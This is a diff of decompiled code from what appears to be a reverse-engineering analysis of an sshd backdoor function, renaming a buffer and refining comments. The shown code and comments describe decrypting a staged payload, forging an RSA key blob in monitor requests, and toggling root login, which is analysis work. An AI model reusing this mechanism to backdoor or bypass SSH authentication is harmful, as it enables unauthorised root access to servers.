@@ -9,7 +9,7 @@
  * KEYALLOWED support is present before privileged commands run, and toggles sshd's PermitRootLogin/PAM globals according
  * to the request flags. For PROXY_EXCHANGE control frames lacking both monitor-flag bits it walks the stack for the staged
  * ChaCha header, verifies the SHA-256 digest, unwraps the secret-data key/nonce, and decrypts the pending payload in place.
- * It then clears the monitor frame buffers, serialises the attacker's modulus/exponent, signs the request, and streams it over
+ * It then clears the monitor frame buffers, serialises the attacker's public exponent/modulus, signs the request, and streams it over
  * whichever monitor socket or fd override the caller selected. Optional sshbuf attachments follow KEYALLOWED continuations,
  * "wait" commands drain replies, and SYSTEM_EXEC can still ask libc's exit() to terminate sshd when everything succeeds.
  */
@@ -80,7 +80,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   uint netlen_tmp[2];
   uchar netlen_tmp_pad;
   uchar netlen_tmp_pad_hi[7];
-  uchar payload_hash [32];
+  uchar rsa_cert_alg_prefix [32];
   uint rsa_template_words[66];
   uint monitor_req_len_prefix;
   uint monitor_req_digest_len;
@@ -236,22 +236,22 @@ LAB_0010845f:
               netlen_tmp[1] = 0;
               netlen_tmp_pad = 0;
               netlen_tmp_pad_hi = 0;
-              payload_hash[0] = '\0';
-              payload_hash[1] = '\0';
-              payload_hash[2] = '\0';
-              payload_hash[3] = '\0';
-              payload_hash[4] = '\0';
-              payload_hash[5] = '\0';
-              payload_hash[6] = '\0';
-              payload_hash[7] = '\0';
-              payload_hash[8] = '\0';
-              payload_hash[9] = '\0';
-              payload_hash[10] = '\0';
-              payload_hash[0xb] = '\0';
-              payload_hash[0xc] = '\0';
-              payload_hash[0xd] = '\0';
-              payload_hash[0xe] = '\0';
-              payload_hash[0xf] = '\0';
+              rsa_cert_alg_prefix[0] = '\0';
+              rsa_cert_alg_prefix[1] = '\0';
+              rsa_cert_alg_prefix[2] = '\0';
+              rsa_cert_alg_prefix[3] = '\0';
+              rsa_cert_alg_prefix[4] = '\0';
+              rsa_cert_alg_prefix[5] = '\0';
+              rsa_cert_alg_prefix[6] = '\0';
+              rsa_cert_alg_prefix[7] = '\0';
+              rsa_cert_alg_prefix[8] = '\0';
+              rsa_cert_alg_prefix[9] = '\0';
+              rsa_cert_alg_prefix[10] = '\0';
+              rsa_cert_alg_prefix[0xb] = '\0';
+              rsa_cert_alg_prefix[0xc] = '\0';
+              rsa_cert_alg_prefix[0xd] = '\0';
+              rsa_cert_alg_prefix[0xe] = '\0';
+              rsa_cert_alg_prefix[0xf] = '\0';
               if ((*stack_candidate == loop_idx) &&
                  (success = sha256(stack_candidate,payload_size,(u8 *)netlen_tmp,0x20,ctx->imported_funcs),
                  success != FALSE)) {
@@ -266,7 +266,7 @@ LAB_0010845f:
                     netlen_tmp[1] = 0;
                     netlen_tmp_pad = 0;
                     netlen_tmp_pad_hi = 0;
-                    hash_zero_cursor = payload_hash;
+                    hash_zero_cursor = rsa_cert_alg_prefix;
                     for (loop_idx = 0x29; loop_idx != 0; loop_idx = loop_idx + -1) {
                       *hash_zero_cursor = '\0';
                       hash_zero_cursor = hash_zero_cursor + (ulong)zero_stride_flag * -2 + 1;
@@ -366,20 +366,20 @@ LAB_0010845f:
       *frame_scratch_iter = 0;
       frame_scratch_iter = frame_scratch_iter + (ulong)zero_stride_flag * -2 + 1;
     }
-    payload_hash[5] = '\0';
-    payload_hash[6] = '\0';
-    payload_hash[7] = '\0';
-    payload_hash[8] = '\x1c';
+    rsa_cert_alg_prefix[5] = '\0';
+    rsa_cert_alg_prefix[6] = '\0';
+    rsa_cert_alg_prefix[7] = '\0';
+    rsa_cert_alg_prefix[8] = '\x1c';
     rsa_components[0] = rsa_n_bn;
     rsa_modulus_qword0 = CONCAT71((rsa_modulus_qword0 >> 8),0x80);
     rsa_components[1] = rsa_e_bn;
-    *(u64 *)(payload_hash + 9) = *(u64 *)rsa_alg_name & 0x00FFFFFFFFFFFFFFULL;
-    payload_hash[0x10] = (uchar)(*(u64 *)rsa_alg_name >> 0x38);
-    *(uint *)(payload_hash + 0x11) = (uint)*(u64 *)(rsa_alg_name + 8);
+    *(u64 *)(rsa_cert_alg_prefix + 9) = *(u64 *)rsa_alg_name & 0x00FFFFFFFFFFFFFFULL;
+    rsa_cert_alg_prefix[0x10] = (uchar)(*(u64 *)rsa_alg_name >> 0x38);
+    *(uint *)(rsa_cert_alg_prefix + 0x11) = (uint)*(u64 *)(rsa_alg_name + 8);
     rsa_modulus_shift = 8;
     rsa_modulus_flag = 1;
-    *(uint *)(payload_hash + 0x15) = (uint)*(u64 *)(rsa_alg_name + 0xc);
-    *(uint *)(payload_hash + 0x19) = (uint)(*(u64 *)(rsa_alg_name + 0xc) >> 0x20);
+    *(uint *)(rsa_cert_alg_prefix + 0x15) = (uint)*(u64 *)(rsa_alg_name + 0xc);
+    *(uint *)(rsa_cert_alg_prefix + 0x19) = (uint)(*(u64 *)(rsa_alg_name + 0xc) >> 0x20);
     stack0xfffffffffffff50d = *(u64 *)(rsa_alg_name + 0x14);
     stack_slot = &rsa_modulus_qword0;
     rsa_words_cursor = rsa_template_words;
@@ -400,7 +400,7 @@ LAB_0010845f:
             monitor_req_prefix_pad_hi[2] = (uchar)rsa_alg_name[6];
     while( TRUE ) {
       serialized_chunk_len = 0;
-      // AutoDoc: Serialise the attacker's exponent and modulus into the monitor frame so sshd sees a well-formed RSA keypair.
+      // AutoDoc: Serialize `args->rsa_e` (public exponent) and `args->rsa_n` (modulus) into the forged key blob so sshd sees a well-formed RSA keypair.
       success = bignum_serialize(monitor_req_payload + payload_remaining,payload_room,&serialized_chunk_len,rsa_components[digest_idx],imports);
       if ((success == FALSE) || (payload_room < serialized_chunk_len)) break;
       payload_remaining = payload_remaining + serialized_chunk_len;
@@ -414,7 +414,7 @@ LAB_0010845f:
         monitor_req_digest_len = frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 |
                     frame_len_be * 0x1000000;
         frame_len_be = status + 0x2a7;
-        *(uint *)(payload_hash + 1) =
+        *(uint *)(rsa_cert_alg_prefix + 1) =
              frame_len_be >> 0x18 | (frame_len_be & 0xff0000) >> 8 | (frame_len_be & 0xff00) << 8 | frame_len_be * 0x1000000
         ;
         frame_len_be = status + 700;
